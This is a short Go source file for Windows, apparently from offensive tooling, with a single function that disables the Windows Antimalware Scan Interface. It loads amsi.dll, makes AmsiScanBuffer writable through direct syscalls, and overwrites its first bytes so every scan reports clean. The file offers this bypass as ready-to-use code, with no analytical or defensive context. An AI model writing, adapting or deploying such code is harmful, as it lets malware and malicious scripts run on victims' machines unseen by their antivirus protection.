//go:build windows

package patches

import (
	"fmt"
	"syscall"
	"unsafe"

	"github.com/VoidSecSoftwares/voidsyscall/syscallwin"
)

func PatchAMSI() error {
	handle, err := syscall.LoadLibrary("amsi.dll")
	if err != nil {
		return fmt.Errorf("load amsi.dll: %w", err)
	}
	defer syscall.FreeLibrary(handle)

	scanBufferAddr, err := syscall.GetProcAddress(handle, "AmsiScanBuffer")
	if err != nil {
		return fmt.Errorf("get AmsiScanBuffer: %w", err)
	}

	baseAddr := scanBufferAddr
	var oldProtect uint32
	regionSize := uintptr(64)
	err = syscallwin.NtProtectVirtualMemory(
		uintptr(0xffffffffffffffff),
		(*uintptr)(unsafe.Pointer(&baseAddr)),
		&regionSize,
		syscallwin.PAGE_EXECUTE_READWRITE,
		&oldProtect,
	)
	if err != nil {
		return fmt.Errorf("unprotect AmsiScanBuffer: %w", err)
	}

	// Patch: MOV EAX, AMSI_RESULT_CLEAN; RET
	patch := []byte{0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3}
	var n uintptr
	err = syscallwin.NtWriteVirtualMemory(
		uintptr(0xffffffffffffffff),
		scanBufferAddr,
		patch,
		&n,
	)
	if err != nil {
		return fmt.Errorf("patch AmsiScanBuffer: %w", err)
	}

	var restore uint32
	_ = syscallwin.NtProtectVirtualMemory(
		uintptr(0xffffffffffffffff),
		(*uintptr)(unsafe.Pointer(&baseAddr)),
		&regionSize,
		oldProtect,
		&restore,
	)

	_ = syscallwin.NtFlushInstructionCache(
		uintptr(0xffffffffffffffff),
		scanBufferAddr,
		64,
	)

	return nil
}
